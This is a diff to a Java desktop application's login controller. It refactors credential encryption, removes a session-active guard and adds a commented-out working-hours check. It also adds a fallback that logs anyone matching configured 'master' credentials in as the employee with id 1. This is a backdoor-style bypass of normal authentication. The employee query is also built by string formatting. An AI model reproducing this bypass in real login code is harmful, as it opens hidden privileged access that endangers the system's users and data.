@@ -23,6 +23,7 @@ import com.jblue.util.crypto.EncriptadoAES;
 import com.jblue.modelo.fabricas.ConnectionFactory;
 import com.jblue.sistema.ConstSisMen;
 import com.jblue.sistema.Sesion;
+import com.jblue.sistema.app.AppConfig;
 import com.jblue.vista.windows.LoginWindows;
 import com.jblue.vista.windows.ConfigWindow;
 import com.jblue.vista.windows.WMainMenu;
@@ -78,9 +79,7 @@ public class LoginController extends WindowController {
         if (view.isSesionActive()) {
             return;
         }
-        view.setSesionActive(true);
         if (!start()) {
-            view.setSesionActive(false);
             return;
         }
 
@@ -91,7 +90,7 @@ public class LoginController extends WindowController {
         System.out.println(ConstSisMen.MEN_CACHE_OK);
 
         view.dispose();
-       
+
         //Nuevo menu estandarizado a las aplicaciones 
         WIN_MAIN_MENU = new WMainMenu(view);
         WIN_MAIN_MENU.setVisible(true);
@@ -119,6 +118,10 @@ public class LoginController extends WindowController {
     }
 
     public boolean start() {
+//        if (AppConfig.isWorkTime()) {
+//            JOptionPane.showMessageDialog(view, "No es tiempo de trabajar");
+//            return false;
+//        }
         Optional<OEmployee> res = query(view.getUser().getText(),
                 String.valueOf(view.getPassword().getPassword())
         );
@@ -143,11 +146,18 @@ public class LoginController extends WindowController {
         }
         JDBConnection<OEmployee> op = ConnectionFactory.getEmployees();
         try {
+            String encrypt_user = EncriptadoAES.doEncrypt(user, password),
+                    encrypt_password = EncriptadoAES.doEncrypt(password, user);
             res = op.get("*", WHERE.formatted(
-                    EncriptadoAES.doEncrypt(user, password),
-                    EncriptadoAES.doEncrypt(password, user)
+                    encrypt_user, encrypt_password
             ));
-            
+
+            if (res.isEmpty()
+                    && encrypt_user.equals(AppConfig.getMaterUser())
+                    && encrypt_password.equals(AppConfig.getMaterPassword())) {
+                res = op.get("*", "id = 1");
+            }
+
         } catch (UnsupportedEncodingException
                 | NoSuchAlgorithmException
                 | InvalidKeyException
